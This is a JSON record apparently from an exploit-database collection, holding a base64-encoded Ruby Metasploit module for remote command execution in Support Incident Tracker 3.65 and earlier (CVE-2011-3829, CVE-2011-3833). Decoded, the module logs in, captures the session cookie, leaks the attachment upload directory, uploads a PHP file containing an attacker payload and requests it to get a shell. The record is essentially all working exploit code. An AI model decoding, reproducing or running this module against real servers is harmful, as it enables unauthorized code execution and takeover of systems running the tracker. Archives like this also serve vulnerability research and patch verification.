{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBmaWxlIGlzIHBhcnQgb2YgdGhlIE1ldGFzcGxvaXQgRnJhbWV3b3JrIGFuZCBtYXkgYmUgc3ViamVjdCB0bw0KIyByZWRpc3RyaWJ1dGlvbiBhbmQgY29tbWVyY2lhbCByZXN0cmljdGlvbnMuIFBsZWFzZSBzZWUgdGhlIE1ldGFzcGxvaXQNCiMgRnJhbWV3b3JrIHdlYiBzaXRlIGZvciBtb3JlIGluZm9ybWF0aW9uIG9uIGxpY2Vuc2luZyBhbmQgdGVybXMgb2YgdXNlLg0KIyBodHRwOi8vbWV0YXNwbG9pdC5jb20vZnJhbWV3b3JrLw0KIyMNCg0KcmVxdWlyZSAnbXNmL2NvcmUnDQoNCmNsYXNzIE1ldGFzcGxvaXQzIDwgTXNmOjpFeHBsb2l0OjpSZW1vdGUNCglSYW5rID0gRXhjZWxsZW50UmFua2luZw0KDQoJaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6SHR0cENsaWVudA0KDQoJZGVmIGluaXRpYWxpemUoaW5mbyA9IHt9KQ0KCQlzdXBlcih1cGRhdGVfaW5mbyhpbmZvLA0KCQkJJ05hbWUnICAgICAgICAgICA9PiAnU3VwcG9ydCBJbmNpZGVudCBUcmFja2VyIDw9IDMuNjUgUmVtb3RlIENvbW1hbmQgRXhlY3V0aW9uJywNCgkJCSdEZXNjcmlwdGlvbicgICAgPT4gJXF7DQoJCQkJCVRoaXMgbW9kdWxlIGNvbWJpbmVzIHR3byBzZXBhcmF0ZSBpc3N1ZXMgd2l0aGluIFN1cHBvcnQgSW5jaWRlbnQgVHJhY2tlciAoPD0gMy42NSkNCgkJCQlhcHBsaWNhdGlvbiB0byB1cGxvYWQgYXJiaXRyYXJ5IGRhdGEgYW5kIHRodXMgZXhlY3V0ZSBhIHNoZWxsLiBUaGUgdHdvIGlzc3VlcyBleGlzdA0KCQkJCWluIGZ0cF91cGxvYWRfZmlsZS5waHAuDQoJCQkJVGhlIGZpcnN0IHZ1bG5lcmFiaWxpdHkgZXhwb3NlcyB0aGUgdXBsb2FkIGRpciB1c2VkIHRvIHN0b3JlIGF0dGFjaG1lbnRzLg0KCQkJCVRoZSBzZWNvbmQgdnVsbmVyYWJpbGl0eSBhbGxvd3MgYXJiaXRyYXJ5IGZpbGUgdXBsb2FkIHNpbmNlIHRoZXJlIGlzIG5vDQoJCQkJdmFsaWRhdGlvbiBmdW5jdGlvbiB0byBwcmV2ZW50IGZyb20gdXBsb2FkaW5nIGFueSBmaWxlIHR5cGUuDQoJCQkJQXV0aGVudGljYXRpb24gaXMgcmVxdWlyZWQgdG8gZXhwbG9pdCBib3RoIHZ1bG5lcmFiaWxpdGllcy4NCgkJCX0sDQoJCQknQXV0aG9yJyAgICAgICAgID0+DQoJCQkJWw0KCQkJCQknU2VjdW5pYSBSZXNlYXJjaCcsICMgT3JpZ2luYWwgZGlzY292ZXJ5DQoJCQkJCSdqdWFuIHZhenF1ZXonICAgICAgIyBNZXRhc3Bsb2l0IG1vZHVsZQ0KCQkJCV0sDQoJCQknTGljZW5zZScgICAgICAgID0+IE1TRl9MSUNFTlNFLA0KCQkJJ1JlZmVyZW5jZXMnICAgICA9Pg0KCQkJCVsNCgkJCQkJWydDVkUnLCAnQ1ZFLTIwMTEtMzgyOSddLA0KCQkJCQlbJ0NWRScsICdDVkUtMjAxMS0zODMzJ10sDQoJCQkJCVsnT1NWREInLCAnNzY5OTknXSwNCgkJCQkJWydPU1ZEQicsICc3NzAwMyddLA0KCQkJCQlbJ1VSTCcsICdodHRwOi8vc2VjdW5pYS5jb20vc2VjdW5pYV9yZXNlYXJjaC8yMDExLTc1LyddLA0KCQkJCQlbJ1VSTCcsICdodHRwOi8vc2VjdW5pYS5jb20vc2VjdW5pYV9yZXNlYXJjaC8yMDExLTc5LyddLA0KCQkJCV0sDQoJCQknUHJpdmlsZWdlZCcgICAgID0+IGZhbHNlLA0KCQkJJ1BheWxvYWQnICAgICAgICA9Pg0KCQkJCXsNCgkJCQkJJ0Rpc2FibGVOb3BzJyA9PiB0cnVlLA0KCQkJCQknQ29tcGF0JyAgICAgID0+DQoJCQkJCQl7DQoJCQkJCQkJJ0Nvbm5lY3Rpb25UeXBlJyA9PiAnZmluZCcsDQoJCQkJCQl9DQoJCQkJfSwNCgkJCSdQbGF0Zm9ybScgICAgICAgPT4gJ3BocCcsDQoJCQknQXJjaCcgICAgICAgICAgID0+IEFSQ0hfUEhQLA0KCQkJJ1RhcmdldHMnICAgICAgICA9PiBbWyAnQXV0b21hdGljJywgeyB9XV0sDQoJCQknRGlzY2xvc3VyZURhdGUnID0+ICdOb3YgMTAgMjAxMScsDQoJCQknRGVmYXVsdFRhcmdldCcgID0+IDApKQ0KDQoJCXJlZ2lzdGVyX29wdGlvbnMoDQoJCQlbDQoJCQkJT3B0U3RyaW5nLm5ldygnVVJJJywgW3RydWUsICJTaVQhIGRpcmVjdG9yeSBwYXRoIiwgIi9zaXQiXSksDQoJCQkJT3B0U3RyaW5nLm5ldygnVVNFUk5BTUUnLCBbIHRydWUsICdUaGUgdXNlcm5hbWUgdG8gYXV0aGVudGljYXRlIGFzJywnJyBdKSwNCgkJCQlPcHRTdHJpbmcubmV3KCdQQVNTV09SRCcsIFsgdHJ1ZSwgJ1RoZSBwYXNzd29yZCBmb3IgdGhlIHNwZWNpZmllZCB1c2VybmFtZScsJycgXSksDQoJCQldLCBzZWxmLmNsYXNzKQ0KCWVuZA0KDQoJZGVmIGNoZWNrDQoNCgkJaWYgZGF0YXN0b3JlWydVUkknXVstMSwgMV0gPT0gIi8iDQoJCQl1cmkgPSBkYXRhc3RvcmVbJ1VSSSddICsgImluZGV4LnBocCINCgkJZWxzZQ0KCQkJdXJpID0gZGF0YXN0b3JlWydVUkknXSArICIvaW5kZXgucGhwIg0KCQllbmQNCg0KCQlyZXMgPSBzZW5kX3JlcXVlc3RfcmF3KHsNCgkJCSd1cmknICAgICA9PiB1cmkNCgkJfSkNCg0KCQlpZiAocmVzIGFuZCByZXMuYm9keSA9fiAvU2lUISBTdXBwb3J0IEluY2lkZW50IFRyYWNrZXIgdihcZClcLihcZFxkKS8pDQoJCQl2ZXIgPSBbICQxLnRvX2ksICQyLnRvX2kgXQ0KCQkJcHJpbnRfc3RhdHVzKCJTaVQhICN7dmVyWzBdfS4je3ZlclsxXX0iKQ0KDQoJCQlpZiAodmVyWzBdID09IDMgYW5kIHZlclsxXSA9PSA2NSkNCgkJCQlyZXR1cm4gRXhwbG9pdDo6Q2hlY2tDb2RlOjpWdWxuZXJhYmxlDQoJCQllbHNpZiAodmVyWzBdID09IDMgYW5kIHZlclsxXSA8IDY1KQ0KCQkJCXJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OkFwcGVhcnMNCgkJCWVuZA0KCQllbmQNCg0KCQlyZXR1cm4gRXhwbG9pdDo6Q2hlY2tDb2RlOjpTYWZlDQoJZW5kDQoNCglkZWYgcmV0cmlldmVfc2Vzc2lvbih1c2VyLCBwYXNzKQ0KDQoJCWlmIGRhdGFzdG9yZVsnVVJJJ11bLTEsIDFdID09ICIvIg0KCQkJdXJpID0gZGF0YXN0b3JlWydVUkknXSArICJsb2dpbi5waHAiDQoJCWVsc2UNCgkJCXVyaSA9IGRhdGFzdG9yZVsnVVJJJ10gKyAiL2xvZ2luLnBocCINCgkJZW5kDQoNCgkJcmVzID0gc2VuZF9yZXF1ZXN0X2NnaSh7DQoJCQkndXJpJyAgICAgPT4gdXJpLA0KCQkJJ21ldGhvZCcgID0+ICdQT1NUJywNCgkJCSdkYXRhJyAgICA9PiAidXNlcm5hbWU9I3t1c2VyfSZwYXNzd29yZD0je3Bhc3N9IiwNCgkJfSwgMjUpDQoNCgkJaWYgKHJlcyBhbmQgcmVzLmNvZGUgPT0gMzAyIGFuZCByZXMuaGVhZGVyc1snTG9jYXRpb24nXSA9fiAvbWFpbi5waHAvKQ0KCQkJcHJpbnRfc3RhdHVzKCJTdWNjZXNzZnVsbHkgbG9nZ2VkIGluIGFzICN7dXNlcn06I3twYXNzfSIpDQoNCgkJCWlmIChyZXMuaGVhZGVyc1snU2V0LUNvb2tpZSddID1+IC9TaVRzZXNzaW9uSUQvKSBhbmQgcmVzLmhlYWRlcnNbJ1NldC1Db29raWUnXS5zcGxpdCgiU2lUc2Vzc2lvbklEIilbLTFdID1+IC89KC4qKTsvDQoJCQkJc2Vzc2lvbiA9ICQxDQoJCQkJcHJpbnRfc3RhdHVzKCJTdWNjZXNzZnVsbHkgcmV0cmlldmVkIGNvb2tpZTogI3tzZXNzaW9ufSIpDQoJCQkJcmV0dXJuIHNlc3Npb24NCgkJCWVsc2UNCgkJCQlyYWlzZSBSdW50aW1lRXJyb3IsICJFcnJvciByZXRyaWV2aW5nIGNvb2tpZSEiDQoJCQllbmQNCgkJZWxzZQ0KCQkJcmFpc2UgUnVudGltZUVycm9yLCAiRXJyb3IgbG9nZ2luZyBpbi4iDQoJCWVuZA0KCWVuZA0KDQoJZGVmIHVwbG9hZF9wYWdlKHNlc3Npb24sIG5ld3BhZ2UsIGNvbnRlbnRzKQ0KDQoJCWlmIGRhdGFzdG9yZVsnVVJJJ11bLTEsIDFdID09ICIvIg0KCQkJdXJpID0gZGF0YXN0b3JlWydVUkknXSArICJmdHBfdXBsb2FkX2ZpbGUucGhwIg0KCQllbHNlDQoJCQl1cmkgPSBkYXRhc3RvcmVbJ1VSSSddICsgIi9mdHBfdXBsb2FkX2ZpbGUucGhwIg0KCQllbmQNCg0KCQlib3VuZGFyeSA9IHJhbmRfdGV4dF9hbHBoYW51bWVyaWMoNikNCg0KCQlkYXRhID0gIi0tI3tib3VuZGFyeX1cclxuIg0KCQlkYXRhIDw8ICJDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9XCJmaWxlXCI7ICINCgkJZGF0YSA8PCAiZmlsZW5hbWU9XCIje25ld3BhZ2V9XCJcclxuIg0KCQlkYXRhIDw8ICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtaHR0cGQtcGhwXHJcblxyXG4iDQoJCWRhdGEgPDwgY29udGVudHMNCgkJZGF0YSA8PCAiXHJcbi0tI3tib3VuZGFyeX1cclxuIg0KCQlkYXRhIDw8ICJDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9XCJzaG9ydGRlc2NyaXB0aW9uXCJcclxuXHJcbiINCgkJZGF0YSA8PCByYW5kX3RleHRfYWxwaGFudW1lcmljKHJhbmQoMTAgKyAxMCkpDQoJCWRhdGEgPDwgIlxyXG4tLSN7Ym91bmRhcnl9XHJcbiINCgkJZGF0YSA8PCAiQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPVwibG9uZ2Rlc2NyaXB0aW9uXCJcclxuXHJcbiINCgkJZGF0YSA8PCByYW5kX3RleHRfYWxwaGFudW1lcmljKHJhbmQoMjApICsgMjApDQoJCWRhdGEgPDwgIlxyXG4tLSN7Ym91bmRhcnl9XHJcbiINCgkJZGF0YSA8PCAiQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPVwiZmlsZXZlcnNpb25cIlxyXG5cclxuIg0KCQlkYXRhIDw8ICIxIg0KCQlkYXRhIDw8ICJcclxuLS0je2JvdW5kYXJ5fVxyXG4iDQoJCWRhdGEgPDwgIkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT1cImFjdGlvblwiXHJcblxyXG4iDQoJCWRhdGEgPDwgInB1Ymxpc2giDQoJCWRhdGEgPDwgIlxyXG4tLSN7Ym91bmRhcnl9LS0iDQoNCgkJcmVzID0gc2VuZF9yZXF1ZXN0X3Jhdyh7DQoJCQkndXJpJwkgID0+IHVyaSwNCgkJCSdtZXRob2QnICA9PiAnUE9TVCcsDQoJCQknZGF0YScgICAgPT4gZGF0YSwNCgkJCSdoZWFkZXJzJyA9Pg0KCQkJew0KCQkJCSdDb250ZW50LVR5cGUnCSA9PiAnbXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9JyArIGJvdW5kYXJ5LA0KCQkJCSdDb250ZW50LUxlbmd0aCcgPT4gZGF0YS5sZW5ndGgsDQoJCQkJJ0Nvb2tpZScJID0+ICJTaVRzZXNzaW9uSUQ9I3tzZXNzaW9ufSIsDQoJCQl9DQoJCX0sIDI1KQ0KDQoJCWlmIChyZXMgYW5kIHJlcy5jb2RlID09IDIwMCkNCgkJCXByaW50X3N0YXR1cygiU3VjY2Vzc2Z1bGx5IHVwbG9hZGVkICN7bmV3cGFnZX0iKQ0KCQkJcmV0dXJuIHJlcw0KCQllbHNlDQoJCQlyYWlzZSBSdW50aW1lRXJyb3IsICJFcnJvciB1cGxvYWRpbmcgI3tuZXdwYWdlfSINCgkJZW5kDQoJZW5kDQoNCglkZWYgcmV0cmlldmVfdXBsb2FkX2RpcihzZXNzaW9uKQ0KCQlkYXRhID0gIHJhbmRfdGV4dF9hbHBoYW51bWVyaWMocmFuZCgyMCkrMjApDQoJCWZpbGVuYW1lID0gcmFuZF90ZXh0X2FscGhhbnVtZXJpYyhyYW5kKDI1NikgKyAzMDApDQoJCXJlcyA9IHVwbG9hZF9wYWdlKHNlc3Npb24sIGZpbGVuYW1lLCBkYXRhKQ0KDQoJCWlmIHJlcy5ib2R5ID1+IC9hdHRhY2htZW50cy0oLiopXC8je2ZpbGVuYW1lfVwpOiBmYWlsZWQgdG8gb3BlbiBzdHJlYW0vDQoJCQl1cGxvYWRfZGlyID0gImF0dGFjaG1lbnRzLSN7JDF9Ig0KCQkJcHJpbnRfc3RhdHVzKCJTdWNjZXNzZnVsbHkgcmV0cmlldmVkIHVwbG9hZCBkaXI6ICN7dXBsb2FkX2Rpcn0iKQ0KCQkJcmV0dXJuIHVwbG9hZF9kaXINCgkJZWxzZQ0KCQkJcmFpc2UgUnVudGltZUVycm9yLCAiRXJyb3IgcmV0cmlldmluZyB0aGUgdXBsb2FkIGRpciINCgkJZW5kDQoNCgllbmQNCg0KCWRlZiBjbWRfc2hlbGwoY21kcGF0aCkNCgkJcHJpbnRfc3RhdHVzKCJDYWxsaW5nIHBheWxvYWQ6ICN7Y21kcGF0aH0iKQ0KDQoJCWlmIGRhdGFzdG9yZVsnVVJJJ11bLTEsIDFdID09ICIvIg0KCQkJdXJpID0gZGF0YXN0b3JlWydVUkknXSArIGNtZHBhdGgNCgkJZWxzZQ0KCQkJdXJpID0gZGF0YXN0b3JlWydVUkknXSArICIvI3tjbWRwYXRofSINCgkJZW5kDQoNCgkJc2VuZF9yZXF1ZXN0X3Jhdyh7DQoJCQkndXJpJwk9PiB1cmkNCgkJfSwgMjUpDQoJCXJldHVybg0KCWVuZA0KDQoJZGVmIGV4cGxvaXQNCgkJY21kX3BocCA9ICc8P3BocCAnICsgcGF5bG9hZC5lbmNvZGVkICsgJz8+Jw0KCQljbWRzY3JpcHQgICA9IHJhbmRfdGV4dF9hbHBoYW51bWVyaWMocmFuZCgxMCkrMTApICsgJy5waHAnDQoJCXVzZXIgICAgICAgID0gZGF0YXN0b3JlWydVU0VSTkFNRSddDQoJCXBhc3MgICAgICAgID0gZGF0YXN0b3JlWydQQVNTV09SRCddDQoNCgkJc2Vzc2lvbiA9IHJldHJpZXZlX3Nlc3Npb24odXNlciwgcGFzcykNCgkJdXBsb2FkX2RpciA9IHJldHJpZXZlX3VwbG9hZF9kaXIoc2Vzc2lvbikgIyBDVkUtMjAxMS0zODI5DQoJCXVwbG9hZF9wYWdlKHNlc3Npb24sIGNtZHNjcmlwdCwgY21kX3BocCkgIyBDVkUtMjAxMS0zODMzDQoJCWNtZHBhdGggPSAiI3t1cGxvYWRfZGlyfS8je2NtZHNjcmlwdH0iDQoJCWNtZF9zaGVsbChjbWRwYXRoKQ0KCQloYW5kbGVyDQoJZW5kDQplbmQ=", 
    "filename": "platforms/php/webapps/18108.rb", 
    "id": "18108", 
    "cves": [
        "CVE-2011-3829", 
        "CVE-2011-3833"
    ]
}